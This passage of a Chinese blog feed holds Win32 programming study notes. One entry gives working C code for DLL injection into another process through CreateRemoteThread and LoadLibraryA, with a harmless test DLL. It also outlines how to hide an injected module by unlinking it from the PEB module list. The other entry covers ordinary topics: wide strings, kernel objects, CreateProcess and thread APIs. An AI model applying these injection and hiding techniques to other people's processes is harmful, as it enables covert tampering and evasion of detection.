class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">MyCreateRemoteThread(<span class="number">752</span>,<span class="number">0x401090</span>);<span class="comment">//别人的线程地址</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="远程线程注入"><a href="#远程线程注入" class="headerlink" title="远程线程注入"></a>远程线程注入</h1><p>把自己的要执行代码写入个Dll，注入进去。   </p><h2 id="什么是注入"><a href="#什么是注入" class="headerlink" title="什么是注入"></a>什么是注入</h2><p><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/win32/16.png" alt="16"></p><h2 id="远程线程注入流程"><a href="#远程线程注入流程" class="headerlink" title="远程线程注入流程"></a>远程线程注入流程</h2><p><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/win32/17.png" alt="17"></p><h1 id="远程线程注入-1"><a href="#远程线程注入-1" class="headerlink" title="远程线程注入"></a>远程线程注入</h1><p>把自己的要执行代码写入个Dll，注入进去。   </p><h2 id="什么是注入-1"><a href="#什么是注入-1" class="headerlink" title="什么是注入"></a>什么是注入</h2><p>思路就是写一个dll，然后再里面创建一个线程，然后执行你想做的操作，注入程序按照流程，先获取对方进程ID，将在目标进程申请一块内存，写入Dll名字，然后获取kernel32的句柄，用于找到LoadLibraryA（因为Kernel32是内核模块的，同个计算机系统每个进程这个地址一样），找到LoadLibraryA之后把这个函数的地址放入创建远程线程函数在远程进程的地址空间中,该线程的线程函数的起始地址.的参数里，参数就是之前我们申请的放入Dll的地址。<br>然后我们可以在运行时调试，通过OD观察远程进程内存是否写入我们的dll路径，以及是否创建成功远程线程，如下图<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/win32/19.png" alt="18"></p><p><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/win32/18.png?x-oss-process=style/yangruiqi.com" alt="19"></p><p>具体代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 远程线程注入.cpp : 定义控制台应用程序的入口点。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="function">BOOL <span class="title">LoadDll</span><span class="params">(DWORD dwProcessID, <span class="keyword">char</span> *szDllPathName)</span> </span>&#123;<span class="comment">//第一个参数进程ID，加载dll的完整路径</span></span><br><span class="line">BOOL bRet;</span><br><span class="line">HANDLE hProcess;</span><br><span class="line">HANDLE hThread;</span><br><span class="line">DWORD dwLength;</span><br><span class="line">DWORD dwLoadAddr;</span><br><span class="line">LPVOID lpAllocAddr;</span><br><span class="line">DWORD dwThreadID;</span><br><span class="line">HMODULE hModule;</span><br><span class="line">bRet = <span class="number">0</span>;</span><br><span class="line">dwLoadAddr = <span class="number">0</span>;</span><br><span class="line">hProcess = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//1.获取进程句柄</span></span><br><span class="line">hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessID);</span><br><span class="line"><span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>) &#123;</span><br><span class="line">OutputDebugString(<span class="string">L"OpenProcess Error!\n"</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//2. 计算DLL路径名字长度，并且要加上0结尾的长度</span></span><br><span class="line">dwLength = <span class="built_in">strlen</span>(szDllPathName) + <span class="number">1</span>;</span><br><span class="line"><span class="comment">//3. 在目标进程分配内存</span></span><br><span class="line">lpAllocAddr = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, dwLength, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (lpAllocAddr == <span class="literal">NULL</span>) &#123;</span><br><span class="line">OutputDebugString(<span class="string">L"VirtualAllocEx Error!\n"</span>);</span><br><span class="line">CloseHandle(hProcess);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//4.拷贝DLL路径名字到目标进程的内存</span></span><br><span class="line">bRet = WriteProcessMemory(hProcess, lpAllocAddr, szDllPathName, dwLength, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (!bRet) &#123;</span><br><span class="line">OutputDebugString(<span class="string">L"WriteProcessMemory Error!\n"</span>);</span><br><span class="line">CloseHandle(hProcess);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//5.因为Kernel32，大家都有，所以从自己进程这获取就行，所以这步是火区模块地址</span></span><br><span class="line">hModule = GetModuleHandle(<span class="string">L"kernel32.dll"</span>);</span><br><span class="line"><span class="keyword">if</span> (!hModule) &#123;</span><br><span class="line">OutputDebugString(<span class="string">L"GetModuleHandle Error!\n"</span>);</span><br><span class="line">CloseHandle(hProcess);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//6.获取LoadLibraryA函数地址</span></span><br><span class="line">dwLoadAddr = (DWORD)GetProcAddress(hModule, <span class="string">"LoadLibraryA"</span>);</span><br><span class="line"><span class="keyword">if</span> (!dwLoadAddr) &#123;</span><br><span class="line">OutputDebugString(<span class="string">L"GetProcAddress Error!\n"</span>);</span><br><span class="line">CloseHandle(hProcess);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//7. 创建远程线程，加载Dll</span></span><br><span class="line">hThread = CreateRemoteThread(hProcess, <span class="literal">NULL</span>,<span class="number">0</span>, (LPTHREAD_START_ROUTINE)dwLoadAddr, lpAllocAddr, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (!hThread) &#123;</span><br><span class="line">OutputDebugString(<span class="string">L"CreateRemoteThread Error!\n"</span>);</span><br><span class="line">CloseHandle(hProcess);</span><br><span class="line">CloseHandle(hModule);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//8.关闭句柄</span></span><br><span class="line">CloseHandle(hProcess);</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">MyCreateRemoteThread</span><span class="params">(DWORD dwProcessID, DWORD dwProcAddr)</span> </span>&#123;</span><br><span class="line">HANDLE hProcess;</span><br><span class="line">HANDLE hThread;</span><br><span class="line">DWORD dwThreadID;</span><br><span class="line">hProcess = <span class="number">0</span>;</span><br><span class="line">dwThreadID = <span class="number">0</span>;</span><br><span class="line">hThread = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//1.获取进程句柄</span></span><br><span class="line">hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessID);</span><br><span class="line"><span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>) &#123;</span><br><span class="line">OutputDebugString(<span class="string">L"OpenProcess Error!\n"</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//2.创建远程线程</span></span><br><span class="line">hThread = CreateRemoteThread(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)dwProcAddr, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;dwThreadID);</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">NULL</span> == hThread) &#123;</span><br><span class="line">OutputDebugString(<span class="string">L"CreateRemoteThread Error!\n"</span>);</span><br><span class="line">CloseHandle(hProcess);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//3.关闭</span></span><br><span class="line">CloseHandle(hThread);</span><br><span class="line">CloseHandle(hProcess);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">LoadDll(<span class="number">16588</span>, <span class="string">"D:\\yangruiqiDll.dll"</span>);<span class="comment">//第一个参数是要注入dll的进程，第二个是dll目录</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试的Dll如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc</span><span class="params">(LPVOID lpParameter)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"注入的代码在执行\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HMODULE hModule,</span></span></span><br><span class="line"><span class="function"><span class="params">DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="function"><span class="params">LPVOID lpReserved</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)ThreadProc, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line"><span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="进程间通信"><a href="#进程间通信" class="headerlink" title="进程间通信"></a>进程间通信</h1><h1 id="模块隐藏"><a href="#模块隐藏" class="headerlink" title="模块隐藏"></a>模块隐藏</h1><p>注入的dll隐藏起来   </p><p>模块是怎么被API遍历出来的  </p><h2 id="模块隐藏之断链"><a href="#模块隐藏之断链" class="headerlink" title="模块隐藏之断链"></a>模块隐藏之断链</h2><ol><li><p>TEB（Thread Environment Block），它记录的相关线程信息，每个线程都有自己的TEB，FS:[0]即是当前线程的TEB。   </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov eax,fs:[0]</span><br></pre></td></tr></table></figure></li><li><p>PEB(Process Enbiroment Block),存放进程信息，每个进程都有自己的PEB，TEB偏移0x30的位置是PEB。  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov eax,fs:[30]</span><br><span class="line">mov PEB,eax</span><br></pre></td></tr></table></figure></li></ol><p>TEB<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/win32/20.png" alt="20"></p><p>PEB<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/win32/21.png" alt="21"></p><p><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/win32/22.png" alt="22"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nt!_UNICODE_STRING</span><br><span class="line">   +0x000 Length           : Uint2B</span><br><span class="line">   +0x002 MaximumLength    : Uint2B</span><br><span class="line">   +0x004 Buffer           : Ptr32 Uint2B</span><br></pre></td></tr></table></figure><p>所以偏移4才是字符串的值<br>隐藏思路就是GetModule找到想隐藏的模块，然后通过查找PEB找到，然后断链，前一个指向后一个。   </p><p>进一步隐藏Vad   </p><p>再进一步隐藏PE特征   </p><p>再进一步查LoadLibary</p><p>所以最后就是代码注入   </p><h1 id="代码注入"><a href="#代码注入" class="headerlink" title="代码注入"></a>代码注入</h1><p>不能有全局变量，常量，毕竟是重定位的数据。<br>导入的函数也不能。<br>不能使用系统调用。（只能在本进程找，然后跟系统调用那样传进去）<br>嵌套函数也不行<br>注意代码要修正，就是复制一个函数时候，函数起始位置其实是个jump，要找到E9之后修正起始复制的位置   </p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>[1] 滴水视频</p>]]></content>
      
      <categories>
          
          <category> 笔记 - WIN32编程笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WIN32 </tag>
            
            <tag> WIN32编程 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>WIN32编程视频的相关笔记一</title>
      <link href="/2018/07/05/WIN32%E7%BC%96%E7%A8%8B%E8%A7%86%E9%A2%91%E7%9A%84%E7%9B%B8%E5%85%B3%E7%AC%94%E8%AE%B0%E4%B8%80/"/>
      <url>/2018/07/05/WIN32%E7%BC%96%E7%A8%8B%E8%A7%86%E9%A2%91%E7%9A%84%E7%9B%B8%E5%85%B3%E7%AC%94%E8%AE%B0%E4%B8%80/</url>
      <content type="html"><![CDATA[<p>编码中GB2312是利用ASIIC的127到256的两个确定一个汉字，所以不同语言不兼容，unicode只是一种编码，即所有语言符号有唯一值，而他的存储格式被分为unicode-8或者-16，即内核单元用几位，具体符号比如16的开头有个FFFE和FEFF是标志大端还是小段存储，在文本开头显示，具体存储看其的编码比如分3个段加不同的前缀，由于unicode最多四个字节存储，但有些一字节即可，所以浪费空间，网络传输一般以unicode-8传输<br>1、宽字符的使用                            </p><p>“中”字的编码：                            </p><p>ASCII：d6 d0<br>UNICODE：4e 2d                             </p><p>char x = ‘中’;                            </p><p>wchar_t x1 = ‘中’;                            </p><p>观察内存中的值，为什么会出现这种情况？                            </p><p>如何告诉编译器我们要使用的是Unicode的那张表呢？                            </p><p>wchar_t x1 = L’中’;                            </p><p>2、宽字符串的使用                            </p><p>char x[] = “中国”;<br>//d6 d0 b9 fa 00               使用拓展ASCII编码表  以00(\0)结尾                </p><p>wchar_t x1[] = L”中国”;<br>//2d 4e fd 56 00 00            使用UNICODE编码表 以00 00(\0\0)结尾                </p><p>3、在控制台打印                            </p><p>char x[] = “中国”;                            </p><p>wchar_t x1[] = L”中国”;                            </p><p>printf(“%s\n”,x);            //使用控制台默认的编码                </p><p>wprintf(L”%s\n”,x1);            //默认使用英文                </p><p>告诉编译器，使用控制台默认的编码格式                            </p><p>(1) 包含头文件 #include &lt;locale.h&gt;                            </p><p>(2) setlocale(LC_ALL,””); //使用控制台默认的编码                            </p><p>4、字符串长度(头文件：#include&lt;string.h&gt;)                            </p><p>char x[] = “中国”;                            </p><p>wchar_t x1[] = L”中国”;                            </p><p>strlen(x);            //取得多字节字符串中字符长度，不包含 00                </p><p>wcslen(x1);            //取得多字节字符串中字符长度，不包含 00 00                </p><p>5、字符串复制                            </p><p>char x[] = “china”;                            </p><p>char x1[] = “123”;                            </p><p>strcpy(x,x1);                            </p><p>wchar_t y[] = L”中国”;                            </p><p>wchar_t y1[] = L”好”;                            </p><p>wcscpy(y,y1);                            </p><p>C语言中的宽字符和多字符                            </p><p>char        wchar_t        //多字节字符类型   宽字符类型            </p><p>printf        wprintf        //打印到控制台函数            </p><p>strlen        wcslen        //获取长度            </p><p>strcpy        wcscpy        //字符串复制            </p><p>strcat        wcscat        //字符串拼接            </p><p>strcmp        wcscmp        //字符串比较            </p><p>strstr        wcsstr        //字符串查找            </p><p>1、什么是Win32 API？有哪些？在哪里？                </p><p>主要是存放在 C:\WINDOWS\system32 下面所有的dll                </p><p>2、非常重要的几个DLL                </p><p>Kernel32.dll:最核心的功能模块，比如管理内存、进程和线程相关的函数等.                </p><p>User32.dll:是Windows用户界面相关应用程序接口,如创建窗口和发送消息等.                </p><p>GDI32.dll:全称是Graphical Device Interface(图形设备接口),包含用于画图和显示文本的函数<br>    比如要显示一个程序窗口，就调用了其中的函数来画这个窗口            </p><p>3、Win32 API中的宽字符和多字节字符                </p><p>Windows是使用C语言开发的，Win32 API同时支持宽字符与多字节字符.                </p><p>(1) 字符类型            (2) 字符串指针    </p><p>char     CHAR        PSTR(LPSTR) 指向多字节字符串    </p><p>wchar_t  WCHAR            PWSTR(LPWSTR) 指向宽字符串    </p><p>宏   TCHAR            宏      PTSTR(LPTSTR)</p><p>字符数组赋值                </p><p>CHAR cha[] = “中国”;                </p><p>WCHAR chw[] = L”中国”;                </p><p>TCHAR cht[] = TEXT(“中国”);                </p><p>为字符串指针赋值：                </p><p>PSTR pszChar = “china”;                //多字节字符</p><p>PWSTR pszWChar = L”china”;                //宽字符</p><p>PTSTR pszTChar = TEXT(“china”);                //如果项目是ASCII的 相当于”china” UNICODE 相当于L”china”</p><p>4、各种版本的MessageBox                </p><p>MessageBoxA(0,”内容多字节”,”标题”,MB_OK);                </p><p>MessageBoxW(0,L”内容宽字节”,L”标题”,MB_OK);                </p><p>MessageBox(0,TEXT(“根据项目字符集决定”),TEXT(“标题”),MB_OK);                </p><p>Windows提供的API 凡是需要传递字符串参数的函数，都会提供两个版本和一个宏.                </p><p>内核对象就是创立时候会在内核里创建一个结构体的对象，看什么属于内核对象可以利用函数closehandle函数查看，或者看其创建的函数，比如第一个参数是不是安全描述符，有安全描述符参数的，一定是内核对象 很多结构体第一个参数都是当前结构体长度大小，为了以后扩容</p><p>句柄表作用是为了内核安全，实用句柄表访问内核对象，用户层不会知道内核对象实际地址，另外句柄表是进程私有的，即同一个进程，在不同句柄表的值不一样，内核对象只有进程才有句柄表，但是有个全局句柄表存储的PID，这个是全局的</p><p>CloseHandle的作用是将计数器减1，并不是直接关掉，然后为0才关闭，但是线程比较特殊，必须为0并且TerminTerminate了才关闭，所以如果只是线程只是基数为0，也没有被关闭。如果他是某进程主线程，改进程就还没死</p><h1 id="进程的创建过程"><a href="#进程的创建过程" class="headerlink" title="进程的创建过程"></a>进程的创建过程</h1><ol><li>映射EXE文件</li><li>创建内核对象EPROCESS</li><li>映射系统DLL（ntdll.dll）</li><li>创建线程内核对象ETHREAD</li><li>如果线程没有挂起为系统启动线程<br> 映射DLL（ntdll.LdrInitiailize Thunk）<br> 线程开始执行  </li><li>如果线程挂起方式创建的：（fdwCreate参数是CREATE_SUSPENDED）<br> 恢复以后开始执行<br> 映射DLL（ntdll.LdrInitiailize Thunk）<br> 线程开始执行  </li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CreateProcess</span><span class="params">(  </span></span></span><br><span class="line"><span class="function"><span class="params">  LPCWSTR pszImageName,  </span></span></span><br><span class="line"><span class="function"><span class="params">  LPCWSTR pszCmdLine,  </span></span></span><br><span class="line"><span class="function"><span class="params">  LPSECURITY_ATTRIBUTES psaProcess,<span class="comment">//安全描述符   </span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPSECURITY_ATTRIBUTES psaThread,  </span></span></span><br><span class="line"><span class="function"><span class="params">  BOOL fInheritHandles, <span class="comment">//是否允许继承    </span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD fdwCreate, </span></span></span><br><span class="line"><span class="function"><span class="params">  LPVOID pvEnvironment,  </span></span></span><br><span class="line"><span class="function"><span class="params">  LPWSTR pszCurDir,<span class="comment">//子进程的工作路径  </span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPSTARTUPINFOW psiStartInfo,<span class="comment">//指向一个用于决定新进程的主窗体如何显示的STARTUPINFO结构体。  </span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPPROCESS_INFORMATION pProcInfo  <span class="comment">//创建之后的返回的参数</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><h4 id="lpApplicationName"><a href="#lpApplicationName" class="headerlink" title="lpApplicationName"></a>lpApplicationName</h4><p>指向一个NULL结尾的、用来指定可执行模块的字符串。<br>这个字符串可以是可执行模块的绝对路径，也可以是相对路径，在后一种情况下，函数使用当前驱动器和目录建立可执行模块的路径。<br>这个参数可以被设为NULL，在这种情况下，可执行模块的名字必须处于 lpCommandLine 参数最前面并由空格符与后面的字符分开。   </p><h4 id="lpProcessAttributes"><a href="#lpProcessAttributes" class="headerlink" title="lpProcessAttributes"></a>lpProcessAttributes</h4><p>指向一个SECURITY_ATTRIBUTES结构体，这个结构体决定是否返回的句柄可以被子进程继承。如果lpProcessAttributes参数为空（NULL），那么句柄不能被继承。</p><h4 id="fInheritHandles"><a href="#fInheritHandles" class="headerlink" title="fInheritHandles"></a>fInheritHandles</h4><p>指示新进程是否从调用进程处继承了句柄。<br>如果参数的值为真，调用进程中的每一个可继承的打开句柄都将被子进程继承。被继承的句柄与原进程拥有完全相同的值和访问权限。</p><h4 id="DWORD-fdwCreate"><a href="#DWORD-fdwCreate" class="headerlink" title="DWORD fdwCreate"></a>DWORD fdwCreate</h4><p>指定附加的、用来控制优先类和进程的创建的标志。以下的创建标志可以以除下面列出的方式外的任何方式组合后指定。<br>比如挂起之类的（fdwCreate参数是CREATE_SUSPENDED</p><h4 id="LPVOID-lpEnvironment"><a href="#LPVOID-lpEnvironment" class="headerlink" title="LPVOID lpEnvironment"></a>LPVOID lpEnvironment</h4><p>指向一个新进程的环境块。如果此参数为空，新进程使用调用进程的环境。</p><h4 id="LPCWSTR-pszImageName"><a href="#LPCWSTR-pszImageName" class="headerlink" title="LPCWSTR pszImageName"></a>LPCWSTR pszImageName</h4><p> 这个参数是模块路径，指向一个以NULL结尾的字符串，这个字符串用来指定子进程的工作路径。这个字符串必须是一个包含驱动器名的绝对路径。如果这个参数为空，新进程将使用与调用进程相同的驱动器和目录。这个选项是一个需要启动应用程序并指定它们的驱动器和工作目录的外壳程序的主要条件。</p><h4 id="参数-LPSTARTUPINFOW-psiStartInfo"><a href="#参数-LPSTARTUPINFOW-psiStartInfo" class="headerlink" title="参数 LPSTARTUPINFOW psiStartInfo"></a>参数 LPSTARTUPINFOW psiStartInfo</h4><p> typedef struct _STARTUPINFO {<br>DWORD cb;<br>LPTSTR lpReserved;<br>LPTSTR lpDesktop;<br>LPTSTR lpTitle;<br>DWORD dwX;<br>DWORD dwY;<br>DWORD dwXSize;<br>DWORD dwYSize;<br>DWORD dwXCountChars;<br>DWORD dwYCountChars;<br>DWORD dwFillAttribute;<br>DWORD dwFlags;<br>WORD wShowWindow;<br>WORD cbReserved2;<br>LPBYTE lpReserved2;<br>HANDLE hStdInput;<br>HANDLE hStdOutput;<br>HANDLE hStdError;<br>} STARTUPINFO, *LPSTARTUPINFO;  </p><h4 id="LPPROCESS-INFORMATION-pProcInfo"><a href="#LPPROCESS-INFORMATION-pProcInfo" class="headerlink" title="LPPROCESS_INFORMATION pProcInfo"></a>LPPROCESS_INFORMATION pProcInfo</h4><p>最后一个参数，是个返回的参数<br>typedef struct _PROCESS_INFORMATION {<br>  HANDLE hProcess;<br>  HANDLE hThread;<br>  DWORD dwProcessId;<br>  DWORD dwThreadId;<br>} PROCESS_INFORMATION;  </p><p>GetModudleFileName//得到当前模块路径</p><p>GetCurrentDirecttory//得到当前工作路径  </p><p>CreateThread原型：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HANDLE CreateThread(</span><br><span class="line">LPSECURITY_ATTRIBUTES lpThreadAttributes,//SD</span><br><span class="line">SIZE_T dwStackSize,//initialstacksize 线程堆栈大小</span><br><span class="line">LPTHREAD_START_ROUTINE lpStartAddress,//threadfunction</span><br><span class="line">LPVOID lpParameter,//threadargument //参数</span><br><span class="line">DWORD dwCreationFlags,//creationoption，创建方式，比如挂起</span><br><span class="line">LPDWORD lpThreadId//threadidentifier，返回的参数，线程ID</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>线程回调是可以没有返回值参数的，格式跟要求一样就行，可以强转，还有要传入给回调参数时，比如从主线程传入的话，要保证不要让主线程都结束了，所以有时候用全局变量传参。   </p><p>多个线程可以使用同一个回调函数，但是运行起来他们的栈都是不同的   </p><p>挂起几次，就要回复几次   </p><p>获取线程退出值，可以用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">BOOL   GetExitCodeThread (</span><br><span class="line"></span><br><span class="line">       HANDLE         hThread,                  // in,线程handle,也就是CreateThread()的返回值</span><br><span class="line"></span><br><span class="line">       LPDWORD      lpExitCode               //out,存储线程结束代码,也就是线程的返回值</span><br><span class="line"></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>等待内核对象结束，单个和多个可用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">DWORD WaitForSingleObject(</span><br><span class="line"></span><br><span class="line">HANDLE hHandle,</span><br><span class="line">DWORD dwMilliseconds//等待时间</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DWORD WaitForMultipleObjects(</span><br><span class="line">DWORD nCount,//等待的句柄数量</span><br><span class="line">const HANDLE* lpHandles,//指向对象句柄数组的指针</span><br><span class="line">BOOL bWaitAll,//true为全部等待，false为等待第一个</span><br><span class="line">DWORD dwMilliseconds</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h2 